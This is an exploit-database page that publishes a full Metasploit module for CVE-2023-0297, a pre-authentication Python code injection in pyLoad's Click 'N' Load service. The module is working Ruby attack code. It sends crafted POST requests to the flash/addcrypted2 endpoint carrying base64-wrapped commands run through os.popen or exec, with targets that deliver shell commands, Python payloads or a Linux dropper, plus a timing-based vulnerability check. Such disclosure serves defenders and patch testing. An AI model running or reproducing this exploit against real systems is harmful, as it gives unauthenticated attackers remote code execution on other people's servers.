---
title: pyLoad js2py Python Execution
url: https://cxsecurity.com/issue/WLB-2023020035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-23
fetch_date: 2025-10-04T07:49:51.925427
---

# pyLoad js2py Python Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **pyLoad js2py Python Execution** **2023.02.22**  Credit:  **[Spencer McIntyre](https://cxsecurity.com/author/Spencer%2BMcIntyre/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2023-0297](https://cxsecurity.com/cveshow/CVE-2023-0297/ "Click to see CVE-2023-0297")**  CWE: **[CWE-94](https://cxsecurity.com/cwe/CWE-94 "CWE-94")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/stopwatch'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
prepend Msf::Exploit::Remote::AutoCheck
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'pyLoad js2py Python Execution',
'Description' => %q{
pyLoad versions prior to 0.5.0b3.dev31 are vulnerable to Python code injection due to the pyimport
functionality exposed through the js2py library. An unauthenticated attacker can issue a crafted POST request
to the flash/addcrypted2 endpoint to leverage this for code execution. pyLoad by default runs two services,
the primary of which is on port 8000 and can not be used by external hosts. A secondary "Click 'N' Load"
service runs on port 9666 and can be used remotely without authentication.
},
'Author' => [
'Spencer McIntyre', # metasploit module
'bAu' # vulnerability discovery
],
'References' => [
[ 'CVE', '2023-0297' ],
[ 'URL', 'https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/' ],
[ 'URL', 'https://github.com/bAuh0lz/CVE-2023-0297\_Pre-auth\_RCE\_in\_pyLoad' ],
[ 'URL', 'https://github.com/pyload/pyload/commit/7d73ba7919e594d783b3411d7ddb87885aea782d' ] # fix commit
],
'DisclosureDate' => '2023-01-13',
'License' => MSF\_LICENSE,
'Platform' => ['unix', 'linux', 'python'],
'Arch' => [ARCH\_CMD, ARCH\_X86, ARCH\_X64, ARCH\_PYTHON],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper
}
],
[
'Python',
{
'Platform' => 'python',
'Arch' => ARCH\_PYTHON,
'Type' => :python\_exec
}
],
],
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
Opt::RPORT(9666),
OptString.new('TARGETURI', [true, 'Base path', '/'])
])
end
def check
sleep\_time = rand(5..10)
\_, elapsed\_time = Rex::Stopwatch.elapsed\_time do
execute\_python("import time; time.sleep(#{sleep\_time})")
end
vprint\_status("Elapsed time: #{elapsed\_time} seconds")
unless elapsed\_time > sleep\_time
return CheckCode::Safe('Failed to test command injection.')
end
CheckCode::Appears('Successfully tested command injection.')
rescue Msf::Exploit::Failed
return CheckCode::Safe('Failed to test command injection.')
end
def exploit
print\_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
case target['Type']
when :unix\_cmd
if execute\_command(payload.encoded)
print\_good("Successfully executed command: #{payload.encoded}")
end
when :python\_exec
execute\_javascript("pyimport builtins;pyimport base64;builtins.exec(base64.b64decode(\"#{Base64.strict\_encode64(payload.encoded)}\"));")
when :linux\_dropper
execute\_cmdstager
end
end
def execute\_command(cmd, \_opts = {})
vprint\_status("Executing command: #{cmd}")
# use the js2py pyimport command to import the os module to execute a command, use base64 to avoid character issues
# using popen instead of system ensures that the request is not blocked
javascript = "pyimport os;pyimport sys;pyimport base64;\_=base64.b64decode(\"#{Base64.strict\_encode64(cmd)}\");os.popen(sys.version\_info[0] < 3?\_:\_.decode('utf-8'));"
execute\_javascript(javascript)
end
def execute\_python(python)
# use the js2py pyimport command to import the builtins module to access exec, use base64 to avoid character issues
javascript = "pyimport builtins;pyimport base64;builtins.exec(base64.b64decode(\"#{Base64.strict\_encode64(python)}\"));"
execute\_javascript(javascript)
end
def execute\_javascript(javascript)
# https://github.com/pyload/pyload/blob/7d73ba7919e594d783b3411d7ddb87885aea782d/src/pyload/core/threads/clicknload\_thread.py#L153
res = send\_request\_cgi(
'method' => 'POST',
'uri' => normalize\_uri(target\_uri.path, 'flash', 'addcrypted2'),
'vars\_post' => {
'crypted' => '',
'jk' => "#{javascript}f=function f2(){};"
}
)
# the command will either cause the response to timeout or return a 500
return if res.nil?
return if res.code == 500 && res.body =~ /Could not decrypt key/
fail\_with(Failure::UnexpectedReply, "The HTTP server replied with a status of #{res.code}")
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020035)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top